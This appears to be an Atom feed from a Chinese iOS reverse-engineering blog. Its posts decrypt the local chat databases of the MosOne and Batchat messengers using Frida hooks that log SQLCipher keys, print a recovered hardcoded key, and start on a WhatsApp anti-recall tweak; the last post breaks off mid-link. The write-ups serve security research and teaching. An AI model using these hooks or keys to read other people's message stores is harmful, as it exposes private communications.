<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lee&#39;Blog 专注逆向、网络安全</title>
  
  <subtitle>专注逆向、网络安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vxer-lee.github.io/"/>
  <updated>2020-09-13T03:43:57.937Z</updated>
  <id>https://vxer-lee.github.io/</id>
  
  <author>
    <name>Lee</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iOS应用逆向与安全-默往聊天数据库解密</title>
    <link href="https://vxer-lee.github.io/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html"/>
    <id>https://vxer-lee.github.io/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html</id>
    <published>2020-07-02T04:50:11.000Z</published>
    <updated>2020-09-13T03:43:57.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盗墓准备：砸壳"><a href="#盗墓准备：砸壳" class="headerlink" title="盗墓准备：砸壳"></a>盗墓准备：砸壳</h2><p>用<code>frida-ios-dump</code>，命令行<code>python3 dump.py -p 2222 com.mostone.life0627</code>。具体过程略过……</p><h2 id="分金定穴：分析"><a href="#分金定穴：分析" class="headerlink" title="分金定穴：分析"></a>分金定穴：分析</h2><p>搜索关键字<code>chatMessageV3.db</code>，定位到函数<code>-[ChatMessageBDManage creatDB]</code></p><p><img src="/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819133008260.png" alt="image-20200819133008260"></p><p>获取userId，将userID转换成MD5</p><p><img src="/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819144724992.png" alt="image-20200819144724992"><br>将MD5与cipherkey拼接。</p><p><img src="/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819145016463.png" alt="image-20200819145016463"><br>.</p><h2 id="起棺盗墓：frida验证"><a href="#起棺盗墓：frida验证" class="headerlink" title="起棺盗墓：frida验证"></a>起棺盗墓：frida验证</h2><p>POC：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MosOne 默往聊天记录数据库密钥HOOK POC</span></span><br><span class="line"><span class="comment"> * by Lee</span></span><br><span class="line"><span class="comment"> * 专注逆向、网络安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*setCipherKey 函数*/</span></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> NSData = ObjC.classes.NSData;</span><br><span class="line">    <span class="keyword">var</span> ssss = NSData.alloc().initWithData_(myString);</span><br><span class="line">    log(<span class="string">"数据库密码长度："</span>+ssss.length());</span><br><span class="line">    log(<span class="string">"数据库密码："</span>);</span><br><span class="line">    log(hexdump(ssss.bytes(),&#123;</span><br><span class="line">      length: ssss.length(),</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    log(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*返回值*/</span></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>验证：</strong></p><p><img src="/%E9%BB%98%E5%BE%80%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200819151627348.png" alt="image-20200819151627348"><br>.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盗墓准备：砸壳&quot;&gt;&lt;a href=&quot;#盗墓准备：砸壳&quot; class=&quot;headerlink&quot; title=&quot;盗墓准备：砸壳&quot;&gt;&lt;/a&gt;盗墓准备：砸壳&lt;/h2&gt;&lt;p&gt;用&lt;code&gt;frida-ios-dump&lt;/code&gt;，命令行&lt;code&gt;python3 dump
      
    
    </summary>
    
    
    
      <category term="iOS逆向" scheme="https://vxer-lee.github.io/tagsssss/iOS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iOS应用逆向与安全-蝙蝠聊天数据库解密</title>
    <link href="https://vxer-lee.github.io/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html"/>
    <id>https://vxer-lee.github.io/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html</id>
    <published>2020-07-01T04:50:11.000Z</published>
    <updated>2020-09-13T03:43:28.426Z</updated>
    
    <content type="html"><![CDATA[<h3 id="需求："><a href="#需求：" class="headerlink" title="需求："></a>需求：</h3><ol><li>数据库解密</li><li>附件匹配关系</li></ol><h2 id="盗墓准备：砸壳"><a href="#盗墓准备：砸壳" class="headerlink" title="盗墓准备：砸壳"></a>盗墓准备：砸壳</h2><p>用庆总Frida框架的<code>frida-ios-dump</code>砸壳工具，其下载地址为<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">https://github.com/AloneMonkey/frida-ios-dump</a><br>刚开始我砸壳并没有成功，后来发现是需要更新frida-ios-dump才可以砸成功，这与iOS版本或frida版本都有关系。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看进程ID 应用名 包名</span></span><br><span class="line">python3 dump.py -l</span><br><span class="line"><span class="comment">#对蝙蝠APP进行砸壳.</span></span><br><span class="line">iproxy 2222 22</span><br><span class="line">python3 dump.py -p 2222 com.woyue.batchat</span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818133931373.png" alt="image-20200818133931373"><br><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818134413336.png" alt="image-20200818134413336"><br>.</p><h2 id="分金定穴：分析"><a href="#分金定穴：分析" class="headerlink" title="分金定穴：分析"></a>分金定穴：分析</h2><p>砸了壳后直接提取出蝙蝠可执行文件，扔到<code>IDA</code>或者<code>Hopper</code>里面分析。</p><h3 id="加密数据库定位"><a href="#加密数据库定位" class="headerlink" title="加密数据库定位"></a>加密数据库定位</h3><p>直接搜索加密数据库字符串交叉引用查看调用的函数<code>batChatBD</code> <code>FTSDB</code> <code>user_config</code></p><h4 id="0x01-batChatBD"><a href="#0x01-batChatBD" class="headerlink" title="#0x01 batChatBD"></a>#0x01 batChatBD</h4><p><code>batChatBD</code>数据库 ，sqlcipher和aes都是固定密钥,这..🦇也太不安全了吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* @class WBFDBManager *&#x2F;</span><br><span class="line">&#x2F;&#x2F;可以看到秘钥是固定的，是对字符串&quot;batChatMsgPwd1234560&quot; 进行加密处理，具体是进行AES加密最后Base64Encode下</span><br><span class="line">r0 &#x3D; [@&quot;batChatMsgPwd1234560&quot; encryptWithkey:@&quot;1&quot;];</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F;AES加密  密钥：&quot;Batchat12345678#&quot;</span><br><span class="line">CCCrypt(r19, 0x1, 0x1, [r0 UTF8String], 0x8, [@&quot;Batchat12345678#&quot; UTF8String], r23, r22, r20, r22 + 0x8 &amp; 0xfffffffffffffff8, &amp;var_58);</span><br><span class="line">&#x2F;&#x2F;Base64编码</span><br><span class="line">[r22 base64EncodedDataWithOptions:0x0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;PageSize大小是传入了一个地址，这里直接看不到内容，需要HOOK获取。</span><br><span class="line">[r23 setCipherKey:[[r0 dataUsingEncoding:0x1 allowLossyConversion:0x1] retain] andCipherPageSize:*(int32_t *)0x101760440];</span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818141001693.png" alt="image-20200818141001693"><br><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818142301564.png" alt="image-20200818142301564"></p><p>接下来进行HOOK的验证，最近比较喜欢用<code>frida</code>来HOOK，简单方便。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#frida-trace frida函数追踪命令行客户端</span></span><br><span class="line"><span class="comment">#-U 代表连接方式USB</span></span><br><span class="line"><span class="comment">#-f 需要HOOK的包名</span></span><br><span class="line"><span class="comment">#-m 代表需要HOOK的 OC方法名,*代表匹配所有。</span></span><br><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -m <span class="string">"-[WCTDatabase setCipherKey:andCipherPageSiz*]"</span></span><br><span class="line"></span><br><span class="line">Instrumenting <span class="built_in">functions</span>...</span><br><span class="line">-[WCTDatabase setCipherKey:andCipherPageSize:]: Loaded handler at <span class="string">"/Users/xxx/Documents/iOSre/__handlers__/__WCTDatabase_setCipherKey_andCi_d4cddb79.js"</span></span><br><span class="line">Started tracing 1 <span class="keyword">function</span>. Press Ctrl+C to stop.</span><br><span class="line">           /* TID 0x403 */</span><br><span class="line">   701 ms  -[WCTDatabase setCipherKey:0x280b6f5d0 andCipherPageSize:0x800]</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以看到hook到了WCTDatabase类的 setCipherKey:andCipherPageSize方法，其中密钥是一个NSData对象的地址，所以这里需要对js文件进行修改才能正确输出其十六进制或字符串，而页大小为0x800，也就是2048的十六进制。</span></span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818143621733.png" alt="image-20200818143621733"></p><p>修改后的<code>__WCTDatabase_setCipherKey_andCi_d4cddb79.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">'-[WCTDatabase setCipherKey:'</span> + args[<span class="number">2</span>] + <span class="string">' andCipherPageSize:'</span> + args[<span class="number">3</span>] + <span class="string">']'</span>);</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> NSData = ObjC.classes.NSData;</span><br><span class="line">    <span class="keyword">var</span> ssss = NSData.alloc().initWithData_(myString);</span><br><span class="line">    log(<span class="string">"数据库密码长度："</span>+ssss.length());</span><br><span class="line">    log(<span class="string">"数据库密码："</span>);</span><br><span class="line">    log(hexdump(ssss.bytes(),&#123;</span><br><span class="line">      length: ssss.length(),</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    log(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><code>batChatBD</code>加密数据库   密钥：<code>DKrF2tB3U5vi39kVODmsbY0UW5Scn8rW</code>  页大小：<code>2048</code><br><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818144913788.png" alt="image-20200818144913788"></p><h4 id="0x1-FTSDB"><a href="#0x1-FTSDB" class="headerlink" title="#0x1 FTSDB"></a>#0x1 FTSDB</h4><p>和batChatBD的方法一样，也是字符串搜索<code>FTSDB</code>关键字，然后再查看交叉引用关系，定位到其创建数据库的函数。</p><p><code>这里的设置密钥函数和batChatBD的不一样，这里没有设置页大小，也就是用了默认的页大小</code>，我通过查看WCDB源码发现，默认的页大小为4096，<code>WCDB是腾讯开源的一个高效、完整、易用的移动数据库框架，基于SQLCipher，支持 iOS、macOS 和 Android</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r0 &#x3D; [@&quot;FTSDBPWD&quot; encryptWithkey:@&quot;2&quot;];</span><br><span class="line">r25 &#x3D; [[r0 dataUsingEncoding:0x1 allowLossyConversion:0x1] retain];</span><br><span class="line">[r23 setCipherKey:r25];</span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818145807201.png" alt="image-20200818145807201"><br>.</p><h4 id="0x2-user-config"><a href="#0x2-user-config" class="headerlink" title="#0x2 user_config"></a>#0x2 user_config</h4><p>读取<code>keychain</code>中的<code>WCDB.BATUSERCONFIGKEY</code>字段内容设为sqlcipher密钥，和FTSDB一样也是默认页大小，4096.</p><p>如果keychain中没有WCDB.BATUSERCONFIGKEY字段则随机生成64位的十六进制作为sqlcipher密钥，并存入keychain当中。</p><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818153437735.png" alt="image-20200818153437735"></p><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818153643131.png" alt="image-20200818153643131"></p><h4 id="0x3-HOOK验证-FTSDB-和-user-config数据库密钥"><a href="#0x3-HOOK验证-FTSDB-和-user-config数据库密钥" class="headerlink" title="#0x3 HOOK验证 FTSDB 和 user_config数据库密钥"></a>#0x3 HOOK验证 FTSDB 和 user_config数据库密钥</h4><p>因为FTSDB和user_config数据库设置密钥方法是同一个，都是用的<code>-[WCTDatabase setCipherKey:]</code> 默认页大小。所以放到这里来统一进行frida 的hook验证。</p><p>启动Frida hook：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -m <span class="string">"-[WCTDatabase setCipherKey:]"</span></span><br></pre></td></tr></table></figure><p>修改对应<code>__WCTDatabase_setCipherKey__.js</code>JS文件内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    log(<span class="string">'-[WCTDatabase setCipherKey:'</span> + args[<span class="number">2</span>] + <span class="string">']'</span>);</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">var</span> NSData = ObjC.classes.NSData;</span><br><span class="line">    <span class="keyword">var</span> ssss = NSData.alloc().initWithData_(myString);</span><br><span class="line">    log(<span class="string">"数据库密码长度："</span>+ssss.length());</span><br><span class="line">    log(<span class="string">"数据库密码："</span>);</span><br><span class="line">    log(hexdump(ssss.bytes(),&#123;</span><br><span class="line">      length: ssss.length(),</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    log(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>再次启动frida hook验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -m <span class="string">"-[WCTDatabase setCipherKey:]"</span></span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818154550865.png" alt="image-20200818154550865"><br>.</p><p>keychain相关的知识，这里不多说了自行百度，或者对<a href="https://github.com/ptoomey3/Keychain-Dumper" target="_blank" rel="noopener">https://github.com/ptoomey3/Keychain-Dumper</a> 项目进行学习研究。<br><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818154803167.png" alt="image-20200818154803167"><br>.</p><h2 id="起棺盗墓：附件匹配"><a href="#起棺盗墓：附件匹配" class="headerlink" title="起棺盗墓：附件匹配"></a>起棺盗墓：附件匹配</h2><p>这其中定位的过程花了很长时间，是从一个函数一步步追踪验证到最后直接HOOK到参数为附件的绝对路径的函数，然后结果分析用的是MD5算法，将附件URL地址MD5加密成附件名 + 后缀。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-[WBFChatFileCacheManager chatFilePath:placeFileData:progress:completion:];</span><br><span class="line">int sub_1000d5dd8();</span><br><span class="line">CC_MD5();</span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818162135910.png" alt="image-20200818162135910"><br>.</p><h4 id="0x00-CC-MD5-js脚本"><a href="#0x00-CC-MD5-js脚本" class="headerlink" title="#0x00 CC_MD5.js脚本"></a>#0x00 CC_MD5.js脚本</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * CC_MD5 HOOK脚本</span></span><br><span class="line"><span class="comment"> * by: Lee</span></span><br><span class="line"><span class="comment"> * 专注逆向、网络安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*函数参数*/</span></span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">log, args, state</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//将md5参数转换成字符串并打印</span></span><br><span class="line">    <span class="keyword">var</span> md5_data = args[<span class="number">0</span>].readUtf8String();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"MD5 - 参数值:"</span>);</span><br><span class="line">    <span class="built_in">console</span>.error(md5_data);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*函数返回值*/</span></span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">log, retval, state</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//将md5返回值转码为32位字符串并打印</span></span><br><span class="line">    <span class="keyword">var</span> md5_digest = hexdump(retval , &#123;<span class="attr">length</span>: <span class="number">16</span>&#125;)</span><br><span class="line">    <span class="keyword">var</span> hexified = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> raw_array = md5_digest.split(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; raw_array.length; a++) &#123;</span><br><span class="line">      <span class="keyword">var</span> line_array = raw_array[a].split(<span class="string">" "</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> b = <span class="number">1</span>; b &lt; line_array.length - <span class="number">1</span> ; b++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line_array[b].length === <span class="number">2</span>) &#123;</span><br><span class="line">          hexified += line_array[b];</span><br><span class="line">          hexified = hexified.trim()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"MD5 - 返回值:"</span>);</span><br><span class="line">    <span class="built_in">console</span>.error(hexified + <span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-验证"><a href="#0x01-验证" class="headerlink" title="#0x01 验证"></a>#0x01 验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  iOSre frida-trace -U -f com.woyue.batchat -i <span class="string">"CC_MD5"</span></span><br></pre></td></tr></table></figure><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818162525337.png" alt="image-20200818162525337"><br>.</p><p><img src="/%E8%9D%99%E8%9D%A0%E8%81%8A%E5%A4%A9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20200818162624969.png" alt="image-20200818162624969"></p><p>谢谢耐心看完，不懂的随时问我。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;需求：&quot;&gt;&lt;a href=&quot;#需求：&quot; class=&quot;headerlink&quot; title=&quot;需求：&quot;&gt;&lt;/a&gt;需求：&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;数据库解密&lt;/li&gt;
&lt;li&gt;附件匹配关系&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;盗墓准备：砸壳&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
    
      <category term="iOS逆向" scheme="https://vxer-lee.github.io/tagsssss/iOS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iOS应用逆向与安全-WhatsApp防撤回开发</title>
    <link href="https://vxer-lee.github.io/iOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8-WhatsApp%E5%88%86%E6%9E%90.html"/>
    <id>https://vxer-lee.github.io/iOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8-WhatsApp%E5%88%86%E6%9E%90.html</id>
    <published>2020-06-29T04:32:31.000Z</published>
    <updated>2020-08-01T14:38:36.615Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>庆总的《iOS应用逆向与安全》看得也差不多了，根据最后一张，自己也分析下最新版本的WhatsApp软件的分析。</p><p>版本：2.20.51</p></blockquote><h2 id="盗墓准备：砸壳"><a href="#盗墓准备：砸壳" class="headerlink" title="盗墓准备：砸壳"></a>盗墓准备：砸壳</h2><p>哈哈😸，最近可能鬼吹灯看多了，很喜欢吧逆向流程分为，盗墓准备-分经定穴-起尸开馆-盗墓。</p><p>砸壳的方式现在真的五花八门，有各种工具来砸壳，其中比较好用有名的是用庆总用Frida框架写的<code>frida-ios-dump</code>，其下载地址为<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">https://github.com/AloneMonkey/frida-ios-dump</a>.</p><p>还有Lakr Aream大佬写的VS Code插件<code>iOSre Extension</code>，该插件包含很多功能，可以列出所有APP，可以动态调试、可以一键脱壳、加载文件系统、下载上传文件。具体使用的话，在VS Code中直接安装该插件即可。其github地址为<a href="https://github.com/Co2333/iOSreExtension" target="_blank" rel="noopener">https://github.com/Co2333/iOSreExtension</a> </p><p>我个人的话比较喜欢<code>CrackXI</code>，是在手机上的越狱应用，在Cydia中添加蚂蚁源，安装CrackXI后打开I在其AppList界面点击需要砸壳的APP，然后点击YES,Full IPA开始砸壳，真的很简单好用。</p><ul><li>frida-ios-dump <a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">https://github.com/AloneMonkey/frida-ios-dump</a> 作者：庆总</li><li>iOSre Extension <a href="https://github.com/Co2333/iOSreExtension" target="_blank" rel="noopener">https://github.com/Co2333/iOSreExtension</a> 作者：Lakr Aream</li><li>CrackerXI <a href="https://apt.cydia.love/misc" target="_blank" rel="noopener">https://apt.cydia.love/misc</a> 作者：蚂蚁源</li></ul><p><code>导出头文件：</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将WhatsApp程序的头文件导出到Headers文件中.</span></span><br><span class="line">class-dump WhatsApp.app -A -H -o ./Headers</span><br></pre></td></tr></table></figure><p><code>还原符号表:</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先在Github上下载restore-symbol</span></span><br><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/tobefuturer/restore-symbol.git</span><br><span class="line"><span class="built_in">cd</span> restore-symbol</span><br><span class="line">make</span><br><span class="line"><span class="comment">#然后链接到系统Bin，方便使用</span></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin</span><br><span class="line">ln /User/lee/restore-symbol/restore-symbol restore-symbol</span><br><span class="line"><span class="comment">#拷贝可执行文件、瘦身、恢复符号表</span></span><br><span class="line"><span class="built_in">cd</span> /User/lee/Desktop/whatsapp</span><br><span class="line">cp WhatsApp.app/whatsApp ./whatsApp_decrypt &amp;&amp; chmod 777 whatsApp_decrypt</span><br><span class="line">lipo whatsApp_decrypt -thin arm64 -o whatsApp &amp;&amp; chmod 777 whatsApp</span><br><span class="line">restore-symbol WhatsApp -o WhatsApp_With_Symbol</span><br><span class="line"><span class="comment">#然后替换WhatsApp.app里面的可执行文件,再用mobiledevice 安装</span></span><br><span class="line">mobiledevice WhatsApp.app</span><br></pre></td></tr></table></figure><p><img src="/iOS%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E4%B8%8E%E5%AE%89%E5%85%A8-WhatsApp%E5%88%86%E6%9E%90/%E6%88%AA%E5%B1%8F2020-06-29%E4%B8%8B%E5%8D%8810.36.40.png" alt="截屏2020-06-29下午10.36.40"><br>.</p><h2 id="分金定穴：分析"><a href="#分金定穴：分析" class="headerlink" title="分金定穴：分析"></a>分金定穴：分析</h2><h4 id="Reveal-查看UI层"><a href="#Reveal-查看UI层" class="headerlink" title="Reveal 查看UI层"></a>Reveal 查看UI层</h4><p>下载最新的Reveal，我这边目前最新的Reveal版本是26，然后配置下RevealServer，具体可以参考这一篇文章。</p><p><a href="https://meilbn.com/2019/08/23/install-reveal2loader-on-jailbreak-device-ios12/#0x03_更新_RevealServer-framework" target="_blank" 